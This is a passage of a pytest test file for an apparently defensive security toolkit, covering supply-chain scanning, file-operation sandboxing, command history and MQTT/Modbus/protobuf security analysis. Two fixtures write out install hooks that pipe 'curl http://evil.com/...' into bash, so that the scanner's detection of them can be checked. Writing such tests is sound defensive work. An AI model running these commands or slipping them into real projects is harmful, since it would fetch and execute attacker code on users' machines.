        from tools.supply_chain_analyzer import lookup_cves, Component
        assert len(lookup_cves([Component(name="django", version="5.0.0", ecosystem="pypi")])) == 0


class TestLicenseCheck:
    def test_copyleft(self):
        from tools.supply_chain_analyzer import check_license
        assert len(check_license("GPL-3.0", "proprietary")) > 0

    def test_permissive(self):
        from tools.supply_chain_analyzer import check_license
        assert len(check_license("MIT", "proprietary")) == 0

    def test_no_license(self):
        from tools.supply_chain_analyzer import check_license
        f = check_license("", "proprietary")
        assert len(f) > 0


class TestUnmaintained:
    def test_deprecated(self):
        from tools.supply_chain_analyzer import check_unmaintained, Component
        assert len(check_unmaintained([Component(name="request", version="2.28", ecosystem="npm")])) > 0

    def test_maintained(self):
        from tools.supply_chain_analyzer import check_unmaintained, Component
        assert len(check_unmaintained([Component(name="express", version="4.18", ecosystem="npm")])) == 0


class TestRiskScoring:
    def test_no_findings(self):
        from tools.supply_chain_analyzer import compute_risk_score
        s, l = compute_risk_score([], [])
        assert s == 0.0

    def test_critical(self):
        from tools.supply_chain_analyzer import compute_risk_score, Finding
        f = [Finding(category="known_vulnerability", severity="critical", component="log4j", version="2.14", title="RCE")]
        s, l = compute_risk_score(f, [])
        assert s > 0 and l == "critical"

    def test_malicious_bonus(self):
        from tools.supply_chain_analyzer import compute_risk_score, Finding
        f = [Finding(category="malicious_install_hook", severity="high", component="p", version="1", title="h")]
        s, _ = compute_risk_score(f, [])
        assert s >= 27


class TestSupplyChainReport:
    def test_post_init(self):
        from tools.supply_chain_analyzer import SupplyChainReport, Finding
        f = Finding(category="t", severity="high", component="x", version="1", title="t")
        r = SupplyChainReport(findings=[f])
        assert r.by_severity["high"] == 1

    def test_to_dict(self):
        from tools.supply_chain_analyzer import SupplyChainReport
        d = SupplyChainReport(risk_score=50.0, risk_level="high").to_dict()
        assert d["risk_score"] == 50.0


class TestManifestParsers:
    def test_requirements_txt(self):
        from tools.supply_chain_analyzer import parse_requirements_txt
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("requests>=2.28.0\nflask==2.3.0\n# comment\nnumpy\n")
            f.flush()
            comps = parse_requirements_txt(f.name)
        os.unlink(f.name)
        assert len(comps) == 3
        assert comps[0].name == "requests"

    def test_requirements_txt_missing(self):
        from tools.supply_chain_analyzer import parse_requirements_txt
        assert parse_requirements_txt("/nonexistent") == []

    def test_package_json(self):
        from tools.supply_chain_analyzer import parse_package_json
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({"dependencies": {"express": "^4.18"}, "devDependencies": {"jest": "^29"}}, f)
            f.flush()
            comps = parse_package_json(f.name)
        os.unlink(f.name)
        assert len(comps) == 2

    def test_package_json_missing(self):
        from tools.supply_chain_analyzer import parse_package_json
        assert parse_package_json("/nonexistent") == []

    def test_go_mod(self):
        from tools.supply_chain_analyzer import parse_go_mod
        with tempfile.NamedTemporaryFile(mode="w", suffix=".mod", delete=False) as f:
            f.write("require (\n\tgithub.com/gin v1.9.0\n)\n")
            f.flush()
            comps = parse_go_mod(f.name)
        os.unlink(f.name)
        assert len(comps) == 1

    def test_go_mod_missing(self):
        from tools.supply_chain_analyzer import parse_go_mod
        assert parse_go_mod("/nonexistent") == []

    def test_package_lock(self):
        from tools.supply_chain_analyzer import parse_package_lock
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({"packages": {"": {}, "node_modules/lodash": {"version": "4.17.21"},
                                    "node_modules/@scope/pkg": {"version": "1.0.0"}}}, f)
            f.flush()
            comps = parse_package_lock(f.name)
        os.unlink(f.name)
        assert len(comps) == 2

    def test_cargo_toml(self):
        from tools.supply_chain_analyzer import parse_cargo_toml
        with tempfile.NamedTemporaryFile(mode="w", suffix=".toml", delete=False) as f:
            f.write('[dependencies]\nserde = "1.0"\ntokio = { version = "1.0" }\n')
            f.flush()
            comps = parse_cargo_toml(f.name)
        os.unlink(f.name)
        assert len(comps) == 2


class TestScanSetupPy:
    def test_safe(self):
        from tools.supply_chain_analyzer import scan_setup_py
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write("from setuptools import setup\nsetup(name='test', version='1.0')\n")
            f.flush()
            assert len(scan_setup_py(f.name)) == 0
        os.unlink(f.name)

    def test_dangerous(self):
        from tools.supply_chain_analyzer import scan_setup_py
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write("import os\nos.system('curl http://evil.com/shell.sh | bash')\n")
            f.flush()
            assert len(scan_setup_py(f.name)) > 0
        os.unlink(f.name)

    def test_missing(self):
        from tools.supply_chain_analyzer import scan_setup_py
        assert scan_setup_py("/nonexistent") == []


class TestScanPackageJsonScripts:
    def test_malicious(self):
        from tools.supply_chain_analyzer import scan_package_json_scripts
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({"scripts": {"postinstall": "curl http://evil.com/install.sh | bash"}}, f)
            f.flush()
            assert len(scan_package_json_scripts(f.name)) > 0
        os.unlink(f.name)

    def test_clean(self):
        from tools.supply_chain_analyzer import scan_package_json_scripts
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({"scripts": {"build": "webpack", "test": "jest"}}, f)
            f.flush()
            assert len(scan_package_json_scripts(f.name)) == 0
        os.unlink(f.name)

    def test_missing(self):
        from tools.supply_chain_analyzer import scan_package_json_scripts
        assert scan_package_json_scripts("/nonexistent") == []


class TestSupplyChainAnalyzerClass:
    def test_analyze(self):
        from tools.supply_chain_analyzer import SupplyChainAnalyzer
        with tempfile.TemporaryDirectory() as d:
            Path(d, "requirements.txt").write_text("requests==2.28.0\n")
            r = SupplyChainAnalyzer().analyze(d)
            assert len(r.components) > 0


# ---------------------------------------------------------------------------
# universal_executor.py
# ---------------------------------------------------------------------------


class TestFileEditor:
    def _editor(self, tmpdir):
        from tools.universal_executor import FileEditor
        return FileEditor(base_dir=tmpdir)

    def test_read_file(self):
        d = tempfile.mkdtemp()
        Path(d, "t.txt").write_text("line1\nline2\n")
        r = self._editor(d).read_file(str(Path(d, "t.txt")))
        assert r.success and "line1" in r.output

    def test_read_not_found(self):
        d = tempfile.mkdtemp()
        r = self._editor(d).read_file(str(Path(d, "nope.txt")))
        assert not r.success

    def test_read_sensitive(self):
        d = tempfile.mkdtemp()
        r = self._editor(d).read_file(str(Path(d, ".env")))
        assert not r.success

    def test_write_file(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "new.txt"))
        r = self._editor(d).write_file(p, "hello")
        assert r.success and Path(p).read_text() == "hello"

    def test_write_no_overwrite(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "old.txt"))
        Path(p).write_text("old")
        r = self._editor(d).write_file(p, "new")
        assert not r.success

    def test_write_overwrite(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "old.txt"))
        Path(p).write_text("old")
        r = self._editor(d).write_file(p, "new", overwrite=True)
        assert r.success

    def test_edit_file(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "e.txt"))
        Path(p).write_text("hello world")
        r = self._editor(d).edit_file(p, "hello", "goodbye")
        assert r.success and Path(p).read_text() == "goodbye world"

    def test_edit_not_found(self):
        d = tempfile.mkdtemp()
        r = self._editor(d).edit_file(str(Path(d, "no.txt")), "a", "b")
        assert not r.success

    def test_edit_not_found_in_file(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "e2.txt"))
        Path(p).write_text("hello")
        r = self._editor(d).edit_file(p, "xyz", "abc")
        assert not r.success

    def test_edit_multiple_occurrences(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "e3.txt"))
        Path(p).write_text("aaa bbb aaa")
        r = self._editor(d).edit_file(p, "aaa", "ccc")
        assert not r.success

    def test_search_in_file(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "s.txt"))
        Path(p).write_text("line1\nhello world\nline3\n")
        r = self._editor(d).search_in_file(p, "hello")
        assert r.success and r.metadata["matches"] == 1

    def test_search_no_matches(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "s2.txt"))
        Path(p).write_text("hello world")
        r = self._editor(d).search_in_file(p, "xyz")
        assert r.success and r.metadata["matches"] == 0

    def test_list_dir(self):
        d = tempfile.mkdtemp()
        os.makedirs(Path(d, "sub"))
        r = self._editor(d).list_directory(d)
        assert r.success

    def test_path_validation(self):
        d = tempfile.mkdtemp()
        r = self._editor(d).read_file("/etc/passwd")
        assert not r.success


class TestPackageManager:
    def test_unknown_manager(self):
        from tools.universal_executor import PackageManager
        r = PackageManager().execute("unknown", "install", "x")
        assert not r.success

    def test_unsupported_action(self):
        from tools.universal_executor import PackageManager
        r = PackageManager().execute("pip", "nonexistent_action", "x")
        assert not r.success


class TestUniversalExecutor:
    def _executor(self, tmpdir):
        from tools.universal_executor import UniversalExecutor
        return UniversalExecutor(base_dir=tmpdir)

    def test_read_action(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "t.txt"))
        Path(p).write_text("hello")
        r = self._executor(d).execute_action({"type": "read_file", "params": {"path": p}})
        assert r.success

    def test_write_action(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "t.txt"))
        r = self._executor(d).execute_action({"type": "write_file", "params": {"path": p, "content": "hi"}})
        assert r.success

    def test_edit_action(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "t.txt"))
        Path(p).write_text("hello")
        r = self._executor(d).execute_action({
            "type": "edit_file", "params": {"path": p, "old_string": "hello", "new_string": "bye"}})
        assert r.success

    def test_search_action(self):
        d = tempfile.mkdtemp()
        p = str(Path(d, "t.txt"))
        Path(p).write_text("hello world")
        r = self._executor(d).execute_action({"type": "search_file", "params": {"path": p, "pattern": "hello"}})
        assert r.success

    def test_list_action(self):
        d = tempfile.mkdtemp()
        r = self._executor(d).execute_action({"type": "list_dir", "params": {"path": d}})
        assert r.success

    def test_unknown_action(self):
        d = tempfile.mkdtemp()
        r = self._executor(d).execute_action({"type": "nope", "params": {}})
        assert not r.success

    def test_capabilities(self):
        from tools.universal_executor import UniversalExecutor
        caps = UniversalExecutor().get_capabilities()
        assert "File Operations" in caps

    def test_is_safe_command(self):
        from tools.universal_executor import UniversalExecutor
        safe, _ = UniversalExecutor().is_safe_command("echo hello")
        assert isinstance(safe, bool)

    def test_is_safe_empty(self):
        from tools.universal_executor import UniversalExecutor
        safe, _ = UniversalExecutor().is_safe_command("")
        assert not safe


class TestExecutionResult:
    def test_creation(self):
        from tools.universal_executor import ExecutionResult
        r = ExecutionResult(True, "out", "", "shell", {"k": "v"})
        assert r.success and r.metadata["k"] == "v"


# ---------------------------------------------------------------------------
# history_manager.py
# ---------------------------------------------------------------------------


class TestCommandEntry:
    def test_full_command(self):
        from tools.history_manager import CommandEntry
        e = CommandEntry(command="scan", args="t.com", timestamp="2024-01-01T00:00:00+00:00",
                         duration_seconds=10, success=True)
        assert e.full_command == "elengenix scan t.com"

    def test_full_command_no_args(self):
        from tools.history_manager import CommandEntry
        e = CommandEntry(command="ai", args="", timestamp="2024-01-01T00:00:00+00:00",
                         duration_seconds=10, success=True)
        assert e.full_command == "elengenix ai"

    def test_age_days(self):
        from tools.history_manager import CommandEntry
        e = CommandEntry(command="scan", args="x", timestamp="2024-01-01T00:00:00+00:00",
                         duration_seconds=0, success=True)
        assert e.age_days > 0


class TestHistoryManager:
    def _hm(self, tmpdir):
        from tools.history_manager import HistoryManager
        hm = HistoryManager()
        hm.HISTORY_FILE = Path(tmpdir) / "history.json"
        return hm

    def test_record_and_get_last(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "t.com", duration=10, success=True, findings=5)
        last = hm.get_last_command()
        assert last and last.command == "scan" and last.findings_count == 5

    def test_record_duplicate_updates(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "a")
        hm.record_command("scan", "a")
        assert len(hm.entries) == 1 and hm.entries[0].run_count == 2

    def test_get_last_empty(self):
        d = tempfile.mkdtemp()
        assert self._hm(d).get_last_command() is None

    def test_get_recent(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "a")
        assert len(hm.get_recent_commands(hours=1)) == 1

    def test_search(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "t.com", target="t.com")
        hm.record_command("recon", "o.com", target="o.com")
        assert len(hm.search("t.com")) >= 1

    def test_search_no_results(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "a")
        assert len(hm.search("zzzzz")) == 0

    def test_favorites(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "a")
        assert hm.add_favorite("scan", "a") is True
        assert len(hm.get_favorites()) == 1
        assert hm.remove_favorite("scan", "a") is True
        assert len(hm.get_favorites()) == 0

    def test_add_favorite_not_found(self):
        d = tempfile.mkdtemp()
        assert self._hm(d).add_favorite("x", "y") is False

    def test_remove_favorite_not_found(self):
        d = tempfile.mkdtemp()
        assert self._hm(d).remove_favorite("x", "y") is False

    def test_popular_commands(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "a")
        hm.record_command("scan", "b")
        hm.record_command("recon", "c")
        popular = hm.get_popular_commands()
        assert popular[0][0] == "scan"

    def test_contextual_suggestions(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("recon", "t.com", target="t.com")
        assert isinstance(hm.get_contextual_suggestions(), list)

    def test_suggest_replacements(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "api.example.com", target="api.example.com", success=True)
        assert isinstance(hm.suggest_replacements("api.other.com"), list)

    def test_get_stats(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "a", success=True)
        hm.record_command("recon", "b", success=False)
        s = hm.get_stats()
        assert s["total_commands"] == 2 and s["unique_commands"] == 2

    def test_get_stats_empty(self):
        d = tempfile.mkdtemp()
        assert self._hm(d).get_stats()["total_commands"] == 0

    def test_format_history_list(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "a")
        assert "Command History" in hm.format_history_list()

    def test_format_empty(self):
        d = tempfile.mkdtemp()
        assert "No command history" in self._hm(d).format_history_list()

    def test_clear_history(self):
        d = tempfile.mkdtemp()
        hm = self._hm(d)
        hm.record_command("scan", "a")
        hm.clear_history()
        assert len(hm.entries) == 0

    def test_extract_domain(self):
        from tools.history_manager import HistoryManager
        hm = HistoryManager()
        assert hm._extract_domain("https://api.example.com/path") == "api.example.com"
        assert hm._extract_domain("") == ""

    def test_target_similarity(self):
        from tools.history_manager import HistoryManager
        hm = HistoryManager()
        assert hm._target_similarity("a.com", "a.com") == 1.0
        assert hm._target_similarity("a.com", "b.com") == 0.3
        assert hm._target_similarity("api.x.com", "api.y.com") == 0.3  # same TLD triggers first
        assert hm._target_similarity("api.example.com", "data.other.net") == 0.0
        assert hm._target_similarity("admin.x.com", "admin.y.com") == 0.3  # same TLD first
        assert hm._target_similarity("", "a.com") == 0.0


class TestGetHistoryManager:
    def test_singleton(self):
        from tools.history_manager import get_history_manager
        assert get_history_manager() is get_history_manager()


# ---------------------------------------------------------------------------
# protocol_analyzer.py
# ---------------------------------------------------------------------------


class TestProtocolType:
    def test_values(self):
        from tools.protocol_analyzer import ProtocolType
        assert ProtocolType.MQTT.value == "mqtt"
        assert ProtocolType.MODBUS.value == "modbus"
        assert ProtocolType.GRPC.value == "grpc"
        assert ProtocolType.PROTOBUF.value == "protobuf"


class TestMQTTAnalyzer:
    def _mqtt_connect(self, username=None, password=None, proto_level=4, client_id=b"test"):
        proto_name = b"MQTT"
        connect_flags = 0x02  # clean session
        if username:
            connect_flags |= 0x80
        if password:
            connect_flags |= 0x40
        payload = (
            struct.pack("!H", len(proto_name)) + proto_name +
            bytes([proto_level, connect_flags]) +
            struct.pack("!H", 60) +
            struct.pack("!H", len(client_id)) + client_id
        )
        if username:
            payload += struct.pack("!H", len(username)) + username
        if password:
            payload += struct.pack("!H", len(password)) + password
        return bytes([0x10, len(payload)]) + payload

    def test_is_mqtt(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        a = MQTTAnalyzer()
        data = bytes([0x10, 0x05, 0x00, 0x04, 0x4D, 0x51, 0x54, 0x54, 0x04])
        assert a.is_mqtt(data) is True

    def test_not_mqtt(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        assert MQTTAnalyzer().is_mqtt(b"\x00") is False

    def test_parse_connect(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        data = self._mqtt_connect()
        result = MQTTAnalyzer().parse_packet(data)
        assert result is not None
        assert result["packet_type"] == "CONNECT"
        assert result["payload"]["protocol_name"] == "MQTT"

    def test_parse_publish(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        topic = b"home/temp"
        msg = b"23.5"
        payload = struct.pack("!H", len(topic)) + topic + msg
        data = bytes([0x30, len(payload)]) + payload
        result = MQTTAnalyzer().parse_packet(data)
        assert result and result["packet_type"] == "PUBLISH"
        assert result["payload"]["topic"] == "home/temp"

    def test_parse_subscribe(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        topic = b"home/#"
        payload = struct.pack("!H", 1) + struct.pack("!H", len(topic)) + topic + bytes([0x01])
        data = bytes([0x82, len(payload)]) + payload
        result = MQTTAnalyzer().parse_packet(data)
        assert result and result["packet_type"] == "SUBSCRIBE"

    def test_analyze_security_no_auth(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        data = self._mqtt_connect()
        findings = MQTTAnalyzer().analyze_security(data)
        assert any(f.finding_type == "missing_authentication" for f in findings)

    def test_analyze_security_weak_password(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        data = self._mqtt_connect(username=b"admin", password=b"123456")
        findings = MQTTAnalyzer().analyze_security(data)
        assert any(f.finding_type == "weak_credentials" for f in findings)

    def test_analyze_security_sensitive_topic(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        topic = b"device/config/admin"
        payload = struct.pack("!H", len(topic)) + topic + b"secret"
        data = bytes([0x30, len(payload)]) + payload
        findings = MQTTAnalyzer().analyze_security(data)
        assert any(f.finding_type == "sensitive_topic" for f in findings)

    def test_analyze_security_wildcard(self):
        from tools.protocol_analyzer import MQTTAnalyzer
        topic = b"home/#"
        payload = struct.pack("!H", len(topic)) + topic + b"data"
        data = bytes([0x30, len(payload)]) + payload
        findings = MQTTAnalyzer().analyze_security(data)
        assert any(f.finding_type == "wildcard_subscription" for f in findings)


class TestModbusAnalyzer:
    def test_is_modbus_tcp(self):
        from tools.protocol_analyzer import ModbusAnalyzer
        data = bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01])
        assert ModbusAnalyzer().is_modbus_tcp(data) is True

    def test_not_modbus(self):
        from tools.protocol_analyzer import ModbusAnalyzer
        data = bytes([0x00, 0x01, 0x00, 0x01, 0x00, 0x06, 0x01])
        assert ModbusAnalyzer().is_modbus_tcp(data) is False

    def test_parse_read_coils(self):
        from tools.protocol_analyzer import ModbusAnalyzer
        data = bytes([0, 1, 0, 0, 0, 6, 1, 0x01, 0, 0, 0, 10])
        r = ModbusAnalyzer().parse_packet(data)
        assert r and r["function_code"] == 0x01 and r["quantity"] == 10

    def test_parse_write_register(self):
        from tools.protocol_analyzer import ModbusAnalyzer
        data = bytes([0, 1, 0, 0, 0, 6, 1, 0x06, 0, 1, 0, 0xFF])
        r = ModbusAnalyzer().parse_packet(data)
        assert r and r["address"] == 1 and r["value"] == 0xFF

    def test_analyze_security_write(self):
        from tools.protocol_analyzer import ModbusAnalyzer
        data = bytes([0, 1, 0, 0, 0, 6, 1, 0x06, 0, 1, 0, 0xFF])
        findings = ModbusAnalyzer().analyze_security(data)
        assert any(f.finding_type == "write_operation" for f in findings)

    def test_analyze_security_broadcast(self):
        from tools.protocol_analyzer import ModbusAnalyzer
        data = bytes([0, 1, 0, 0, 0, 6, 0, 0x03, 0, 0, 0, 10])
        findings = ModbusAnalyzer().analyze_security(data)
        assert any(f.finding_type == "broadcast_message" for f in findings)

    def test_analyze_security_large_read(self):
        from tools.protocol_analyzer import ModbusAnalyzer
        data = bytes([0, 1, 0, 0, 0, 6, 1, 0x03, 0, 0, 1, 0])
        findings = ModbusAnalyzer().analyze_security(data)
        assert any(f.finding_type == "large_data_request" for f in findings)


class TestProtobufAnalyzer:
    def test_is_protobuf(self):
        from tools.protocol_analyzer import ProtobufAnalyzer
        # field 1 varint=42, field 2 length-delimited "hello"
        data = bytes([0x08, 0x2A, 0x12, 0x05]) + b"hello"
        assert ProtobufAnalyzer().is_protobuf(data) is True

    def test_not_protobuf_short(self):
        from tools.protocol_analyzer import ProtobufAnalyzer
        assert ProtobufAnalyzer().is_protobuf(b"\x08") is False

    def test_parse_varint(self):
        from tools.protocol_analyzer import ProtobufAnalyzer
        fields = ProtobufAnalyzer().parse_protobuf(bytes([0x08, 0x2A]))
        assert len(fields) == 1 and fields[0]["value"] == 42

    def test_parse_string(self):
        from tools.protocol_analyzer import ProtobufAnalyzer
        data = bytes([0x12, 0x05]) + b"hello"
        fields = ProtobufAnalyzer().parse_protobuf(data)
        assert fields[0]["as_string"] == "hello"

    def test_grpc_metadata(self):
        from tools.protocol_analyzer import ProtobufAnalyzer
        f = ProtobufAnalyzer().analyze_grpc_metadata({"content-type": "application/grpc-web+proto"})
        assert any(x.finding_type == "grpc_web_mode" for x in f)

    def test_grpc_no_timeout(self):
        from tools.protocol_analyzer import ProtobufAnalyzer
        f = ProtobufAnalyzer().analyze_grpc_metadata({"content-type": "application/grpc"})
        assert any(x.finding_type == "missing_timeout" for x in f)

    def test_detect_secrets(self):
        from tools.protocol_analyzer import ProtobufAnalyzer
        data = b'\x08\x2A' + b'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'
        f = ProtobufAnalyzer().detect_secrets_in_protobuf(data)
        assert any("jwt_token" in x.finding_type for x in f)


class TestProtocolAnalyzer:
    def test_detect_mqtt(self):
        from tools.protocol_analyzer import ProtocolAnalyzer, ProtocolType
        data = bytes([0x10, 0x05, 0x00, 0x04, 0x4D, 0x51, 0x54, 0x54, 0x04])
        assert ProtocolAnalyzer().detect_protocol(data, dst_port=1883) == ProtocolType.MQTT

    def test_detect_modbus(self):
        from tools.protocol_analyzer import ProtocolAnalyzer, ProtocolType
        data = bytes([0, 1, 0, 0, 0, 6, 1, 3, 0, 0, 0, 10])
        assert ProtocolAnalyzer().detect_protocol(data, src_port=502) == ProtocolType.MODBUS

    def test_analyze_packet(self):
        from tools.protocol_analyzer import ProtocolAnalyzer
        data = bytes([0x08, 0x2A])
        p = ProtocolAnalyzer().analyze_packet(data, ("127.0.0.1", 8080), ("127.0.0.1", 9090))
        assert p.protocol is not None

    def test_hex_dump(self):
        from tools.protocol_analyzer import ProtocolAnalyzer
        r = ProtocolAnalyzer().analyze_hex_dump("08 2a")
        assert "protocol" in r and r["length"] == 2

    def test_hex_dump_invalid(self):
        from tools.protocol_analyzer import ProtocolAnalyzer
        assert "error" in ProtocolAnalyzer().analyze_hex_dump("xyz")

    def test_entropy(self):
        from tools.protocol_analyzer import ProtocolAnalyzer
        a = ProtocolAnalyzer()
        assert a._calculate_entropy(b"") == 0.0
        assert a._calculate_entropy(b"AAAA") == 0.0
        assert a._calculate_entropy(b"ABCD") > 0.0

    def test_generate_report(self):
        from tools.protocol_analyzer import ProtocolAnalyzer
        r = ProtocolAnalyzer().generate_report()
        assert r["total_packets"] == 0 and r["total_findings"] == 0

    def test_format_report(self):
        from tools.protocol_analyzer import format_protocol_report
        r = {"total_packets": 10, "total_findings": 3,
             "protocol_distribution": {"mqtt": 5}, "severity_distribution": {"high": 2},
             "critical_findings": [], "fuzzing_hints": []}
        out = format_protocol_report(r)
        assert "PROTOCOL ANALYSIS REPORT" in out


class TestProtocolPacket:
    def test_creation(self):
        from tools.protocol_analyzer import ProtocolPacket, ProtocolType
        p = ProtocolPacket(timestamp=1.0, src_addr=("127.0.0.1", 1883),
                           dst_addr=("127.0.0.1", 9090), protocol=ProtocolType.MQTT, raw_data=b"\x10\x00")
        assert p.protocol == ProtocolType.MQTT


class TestProtocolFinding:
    def test_creation(self):
        from tools.protocol_analyzer import ProtocolFinding, ProtocolType
        f = ProtocolFinding(finding_id="t:1", protocol=ProtocolType.MQTT,
                            finding_type="test", severity="high", confidence=0.9, description="d")
        assert f.severity == "high" and f.evidence == {}


# ---------------------------------------------------------------------------
# api_server.py
# ---------------------------------------------------------------------------


class TestScanRecord:
    def test_creation(self):
        from tools.api_server import ScanRecord
        r = ScanRecord("https://target.com", "full")
        assert r.status == "pending" and r.target == "https://target.com"

    def test_to_dict(self):
        from tools.api_server import ScanRecord
        d = ScanRecord("https://target.com", "quick").to_dict()
        assert d["target"] == "https://target.com" and d["status"] == "pending"

    def test_to_dict_with_findings(self):
        from tools.api_server import ScanRecord
        r = ScanRecord("https://t.com")
        r.findings = [{"type": "xss"}]
        assert r.to_dict()["findings_count"] == 1

    def test_to_dict_with_error(self):
        from tools.api_server import ScanRecord
        r = ScanRecord("https://t.com")
        r.status = "failed"
        r.error = "timeout"
        assert r.to_dict()["error"] == "timeout"


class TestApiServerFastAPI:
    def test_has_fastapi(self):
        from tools.api_server import _HAS_FASTAPI
        assert isinstance(_HAS_FASTAPI, bool)

    def test_app_exists_if_fastapi(self):
        try:
            from fastapi import FastAPI  # noqa
            from tools.api_server import app
            assert app is not None
        except ImportError:
            pytest.skip("FastAPI not installed")

    def test_health_if_fastapi(self):
        try:
            from fastapi.testclient import TestClient
            from tools.api_server import app
            client = TestClient(app)
            r = client.get("/health")
            assert r.status_code == 200
            assert r.json()["status"] == "healthy"
        except ImportError:
            pytest.skip("FastAPI not installed")


# ---------------------------------------------------------------------------
# analysis_pipeline.py
# ---------------------------------------------------------------------------


class TestAnalysisPipelineBaseUrlHint:
    def test_http_url(self):
        from tools.analysis_pipeline import AnalysisPipeline
        ms = MagicMock()
        ms.snapshot.return_value = {"target": "https://example.com"}
        assert AnalysisPipeline._base_url_hint(ms) == "https://example.com"

    def test_without_protocol(self):
        from tools.analysis_pipeline import AnalysisPipeline
        ms = MagicMock()
        ms.snapshot.return_value = {"target": "example.com"}
        assert AnalysisPipeline._base_url_hint(ms) == "https://example.com"

    def test_empty(self):
        from tools.analysis_pipeline import AnalysisPipeline
        ms = MagicMock()
        ms.snapshot.return_value = {"target": ""}
        assert AnalysisPipeline._base_url_hint(ms) == "http://localhost"

    def test_exception(self):
        from tools.analysis_pipeline import AnalysisPipeline
        ms = MagicMock()
        ms.snapshot.side_effect = Exception("db error")
        assert AnalysisPipeline._base_url_hint(ms) == "http://localhost"


# ---------------------------------------------------------------------------
# orchestrator.py
# ---------------------------------------------------------------------------


class TestOrchestratorBasic:
    def test_import(self):
        import core.orchestrator
        assert hasattr(core.orchestrator, "SmartOrchestrator")

    def test_instantiate(self):
        from core.orchestrator import SmartOrchestrator
        orch = SmartOrchestrator(max_concurrency=3)
        assert orch is not None
